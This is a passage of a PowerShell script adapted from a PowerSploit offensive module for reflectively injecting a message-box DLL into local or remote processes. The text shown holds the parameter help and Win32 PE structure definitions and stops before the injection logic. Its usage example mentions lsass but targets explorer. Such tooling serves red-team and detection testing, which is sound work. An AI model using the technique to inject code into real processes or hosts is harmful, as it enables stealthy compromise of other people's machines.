function Invoke-ReflectivePEInjection
{
<#
.SYNOPSIS

The script is mostly copied from the PowerSploit Invoke-ReflectivePEnjection module written by Joe Bialek.
The script injects simple msgbox dll into given processs.

.DESCRIPTION

Reflectively loads a MsgBox dll in to a remote process.


.PARAMETER ComputerName

Optional, an array of computernames to run the script on.

.PARAMETER FuncReturnType

Optional, the return type of the function being called in the DLL. Default: Void
    Options: String, WString, Void. See notes for more information.
    IMPORTANT: For DLLs being loaded remotely, only Void is supported.

.PARAMETER ExeArgs

Optional, arguments to pass to the executable being reflectively loaded.

.PARAMETER ProcName

Optional, the name of the remote process to inject the DLL in to. If not injecting in to remote process, ignore this.

.PARAMETER ProcId

Optional, the process ID of the remote process to inject the DLL in to. If not injecting in to remote process, ignore this.

.PARAMETER ForceASLR

Optional, will force the use of ASLR on the PE being loaded even if the PE indicates it doesn't support ASLR. Some PE's will work with ASLR even
    if the compiler flags don't indicate they support it. Other PE's will simply crash. Make sure to test this prior to using. Has no effect when
    loading in to a remote process.

.PARAMETER DoNotZeroMZ

Optional, will not wipe the MZ from the first two bytes of the PE. This is to be used primarily for testing purposes and to enable loading the same PE with Invoke-ReflectivePEInjection more than once.


.EXAMPLE

Refectively the msgbox dll in to the lsass process on a remote computer.
Invoke-ReflectivePEInjection -ProcName explorer
#>

[Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseApprovedVerbs', '')]
[Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseSingularNouns', '')]
[Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
[Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
[Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSPossibleIncorrectComparisonWithNull', '')]
[CmdletBinding()]
Param(
    [Parameter(Position = 1)]
    [String[]]
    $ComputerName,

    [Parameter(Position = 2)]
    [ValidateSet( 'WString', 'String', 'Void' )]
    [String]
    $FuncReturnType = 'Void',

    [Parameter(Position = 3)]
    [String]
    $ExeArgs,

    [Parameter(Position = 4)]
    [Int32]
    $ProcId,

    [Parameter(Position = 5)]
    [String]
    $ProcName,

    [Switch]
    $ForceASLR,

    [Switch]
    $DoNotZeroMZ
)

Set-StrictMode -Version 2


$RemoteScriptBlock = {
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Byte[]]
        $PEBytes,

        [Parameter(Position = 1, Mandatory = $true)]
        [String]
        $FuncReturnType,

        [Parameter(Position = 2, Mandatory = $true)]
        [Int32]
        $ProcId,

        [Parameter(Position = 3, Mandatory = $true)]
        [String]
        $ProcName,

        [Parameter(Position = 4, Mandatory = $true)]
        [Bool]
        $ForceASLR
    )

    ###################################
    ##########  Win32 Stuff  ##########
    ###################################
    Function Get-Win32Types
    {
        $Win32Types = New-Object System.Object

        #Define all the structures/enums that will be used
        #   This article shows you how to do this with reflection: http://www.exploit-monday.com/2012/07/structs-and-enums-using-reflection.html
        $Domain = [AppDomain]::CurrentDomain
        $DynamicAssembly = New-Object System.Reflection.AssemblyName('DynamicAssembly')
        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('DynamicModule', $false)
        $ConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]


        ############    ENUM    ############
        #Enum MachineType
        $TypeBuilder = $ModuleBuilder.DefineEnum('MachineType', 'Public', [UInt16])
        $TypeBuilder.DefineLiteral('Native', [UInt16] 0) | Out-Null
        $TypeBuilder.DefineLiteral('I386', [UInt16] 0x014c) | Out-Null
        $TypeBuilder.DefineLiteral('Itanium', [UInt16] 0x0200) | Out-Null
        $TypeBuilder.DefineLiteral('x64', [UInt16] 0x8664) | Out-Null
        $MachineType = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name MachineType -Value $MachineType

        #Enum MagicType
        $TypeBuilder = $ModuleBuilder.DefineEnum('MagicType', 'Public', [UInt16])
        $TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR32_MAGIC', [UInt16] 0x10b) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR64_MAGIC', [UInt16] 0x20b) | Out-Null
        $MagicType = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name MagicType -Value $MagicType

        #Enum SubSystemType
        $TypeBuilder = $ModuleBuilder.DefineEnum('SubSystemType', 'Public', [UInt16])
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_UNKNOWN', [UInt16] 0) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_NATIVE', [UInt16] 1) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_GUI', [UInt16] 2) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CUI', [UInt16] 3) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_POSIX_CUI', [UInt16] 7) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CE_GUI', [UInt16] 9) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_APPLICATION', [UInt16] 10) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER', [UInt16] 11) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER', [UInt16] 12) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_ROM', [UInt16] 13) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_XBOX', [UInt16] 14) | Out-Null
        $SubSystemType = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name SubSystemType -Value $SubSystemType

        #Enum DllCharacteristicsType
        $TypeBuilder = $ModuleBuilder.DefineEnum('DllCharacteristicsType', 'Public', [UInt16])
        $TypeBuilder.DefineLiteral('RES_0', [UInt16] 0x0001) | Out-Null
        $TypeBuilder.DefineLiteral('RES_1', [UInt16] 0x0002) | Out-Null
        $TypeBuilder.DefineLiteral('RES_2', [UInt16] 0x0004) | Out-Null
        $TypeBuilder.DefineLiteral('RES_3', [UInt16] 0x0008) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE', [UInt16] 0x0040) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY', [UInt16] 0x0080) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_NX_COMPAT', [UInt16] 0x0100) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_ISOLATION', [UInt16] 0x0200) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_SEH', [UInt16] 0x0400) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_BIND', [UInt16] 0x0800) | Out-Null
        $TypeBuilder.DefineLiteral('RES_4', [UInt16] 0x1000) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_WDM_DRIVER', [UInt16] 0x2000) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE', [UInt16] 0x8000) | Out-Null
        $DllCharacteristicsType = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value $DllCharacteristicsType

        ###########    STRUCT    ###########
        #Struct IMAGE_DATA_DIRECTORY
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DATA_DIRECTORY', $Attributes, [System.ValueType], 8)
        ($TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public')).SetOffset(0) | Out-Null
        ($TypeBuilder.DefineField('Size', [UInt32], 'Public')).SetOffset(4) | Out-Null
        $IMAGE_DATA_DIRECTORY = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value $IMAGE_DATA_DIRECTORY

        #Struct IMAGE_FILE_HEADER
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_FILE_HEADER', $Attributes, [System.ValueType], 20)
        $TypeBuilder.DefineField('Machine', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfSections', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('PointerToSymbolTable', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfSymbols', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('SizeOfOptionalHeader', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('Characteristics', [UInt16], 'Public') | Out-Null
        $IMAGE_FILE_HEADER = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value $IMAGE_FILE_HEADER

        #Struct IMAGE_OPTIONAL_HEADER64
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER64', $Attributes, [System.ValueType], 240)
        ($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
        ($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
        ($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
        ($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
        ($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
        ($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
        ($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
        ($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
        ($TypeBuilder.DefineField('ImageBase', [UInt64], 'Public')).SetOffset(24) | Out-Null
        ($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
        ($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
        ($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
        ($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
        ($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
        ($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
        ($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
        ($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
        ($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
        ($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
        ($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
        ($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
        ($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
        ($TypeBuilder.DefineField('SizeOfStackReserve', [UInt64], 'Public')).SetOffset(72) | Out-Null
        ($TypeBuilder.DefineField('SizeOfStackCommit', [UInt64], 'Public')).SetOffset(80) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt64], 'Public')).SetOffset(88) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt64], 'Public')).SetOffset(96) | Out-Null
        ($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(104) | Out-Null
        ($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(108) | Out-Null
        ($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
        ($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
        ($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
        ($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
        ($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
        ($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
        ($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
        ($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
        ($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
        ($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
        ($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
        ($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
        ($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
        ($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
        ($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(224) | Out-Null
        ($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(232) | Out-Null
        $IMAGE_OPTIONAL_HEADER64 = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value $IMAGE_OPTIONAL_HEADER64

        #Struct IMAGE_OPTIONAL_HEADER32
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER32', $Attributes, [System.ValueType], 224)
        ($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
        ($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
        ($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
        ($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
        ($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
        ($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
        ($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
        ($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
        ($TypeBuilder.DefineField('BaseOfData', [UInt32], 'Public')).SetOffset(24) | Out-Null
        ($TypeBuilder.DefineField('ImageBase', [UInt32], 'Public')).SetOffset(28) | Out-Null
        ($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
        ($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
        ($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
        ($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
        ($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
        ($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
        ($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
        ($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
        ($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
        ($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
        ($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
        ($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
        ($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
        ($TypeBuilder.DefineField('SizeOfStackReserve', [UInt32], 'Public')).SetOffset(72) | Out-Null
        ($TypeBuilder.DefineField('SizeOfStackCommit', [UInt32], 'Public')).SetOffset(76) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt32], 'Public')).SetOffset(80) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt32], 'Public')).SetOffset(84) | Out-Null
        ($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(88) | Out-Null
        ($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(92) | Out-Null
        ($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(96) | Out-Null
        ($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(104) | Out-Null
        ($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
        ($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
        ($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
        ($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
        ($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
        ($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
        ($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
        ($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
        ($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
        ($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
        ($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
        ($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
        ($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
        ($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
        $IMAGE_OPTIONAL_HEADER32 = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER32 -Value $IMAGE_OPTIONAL_HEADER32

        #Struct IMAGE_NT_HEADERS64
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS64', $Attributes, [System.ValueType], 264)
        $TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
        $TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER64, 'Public') | Out-Null
        $IMAGE_NT_HEADERS64 = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value $IMAGE_NT_HEADERS64

        #Struct IMAGE_NT_HEADERS32
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS32', $Attributes, [System.ValueType], 248)
        $TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
        $TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER32, 'Public') | Out-Null
        $IMAGE_NT_HEADERS32 = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS32 -Value $IMAGE_NT_HEADERS32

        #Struct IMAGE_DOS_HEADER
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DOS_HEADER', $Attributes, [System.ValueType], 64)
        $TypeBuilder.DefineField('e_magic', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_cblp', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_cp', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_crlc', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_cparhdr', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_minalloc', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_maxalloc', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_ss', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_sp', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_csum', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_ip', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_cs', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_lfarlc', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_ovno', [UInt16], 'Public') | Out-Null

        $e_resField = $TypeBuilder.DefineField('e_res', [UInt16[]], 'Public, HasFieldMarshal')
        $ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
        $FieldArray = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
        $AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 4))
        $e_resField.SetCustomAttribute($AttribBuilder)

        $TypeBuilder.DefineField('e_oemid', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_oeminfo', [UInt16], 'Public') | Out-Null

        $e_res2Field = $TypeBuilder.DefineField('e_res2', [UInt16[]], 'Public, HasFieldMarshal')
        $ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
        $AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 10))
        $e_res2Field.SetCustomAttribute($AttribBuilder)

        $TypeBuilder.DefineField('e_lfanew', [Int32], 'Public') | Out-Null
        $IMAGE_DOS_HEADER = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value $IMAGE_DOS_HEADER

        #Struct IMAGE_SECTION_HEADER
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_SECTION_HEADER', $Attributes, [System.ValueType], 40)

        $nameField = $TypeBuilder.DefineField('Name', [Char[]], 'Public, HasFieldMarshal')
        $ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
        $AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 8))
        $nameField.SetCustomAttribute($AttribBuilder)

        $TypeBuilder.DefineField('VirtualSize', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('SizeOfRawData', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('PointerToRawData', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('PointerToRelocations', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('PointerToLinenumbers', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfRelocations', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfLinenumbers', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
        $IMAGE_SECTION_HEADER = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_SECTION_HEADER -Value $IMAGE_SECTION_HEADER

        #Struct IMAGE_BASE_RELOCATION
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_BASE_RELOCATION', $Attributes, [System.ValueType], 8)
        $TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('SizeOfBlock', [UInt32], 'Public') | Out-Null
        $IMAGE_BASE_RELOCATION = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_BASE_RELOCATION -Value $IMAGE_BASE_RELOCATION

        #Struct IMAGE_IMPORT_DESCRIPTOR
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_IMPORT_DESCRIPTOR', $Attributes, [System.ValueType], 20)
        $TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('ForwarderChain', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('FirstThunk', [UInt32], 'Public') | Out-Null
        $IMAGE_IMPORT_DESCRIPTOR = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_IMPORT_DESCRIPTOR -Value $IMAGE_IMPORT_DESCRIPTOR

        #Struct IMAGE_EXPORT_DIRECTORY
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_EXPORT_DIRECTORY', $Attributes, [System.ValueType], 40)
        $TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('MajorVersion', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('MinorVersion', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('Base', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfFunctions', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfNames', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('AddressOfFunctions', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('AddressOfNames', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('AddressOfNameOrdinals', [UInt32], 'Public') | Out-Null
        $IMAGE_EXPORT_DIRECTORY = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value $IMAGE_EXPORT_DIRECTORY

        #Struct LUID
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('LUID', $Attributes, [System.ValueType], 8)
        $TypeBuilder.DefineField('LowPart', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('HighPart', [UInt32], 'Public') | Out-Null
        $LUID = $TypeBuilder.CreateType()
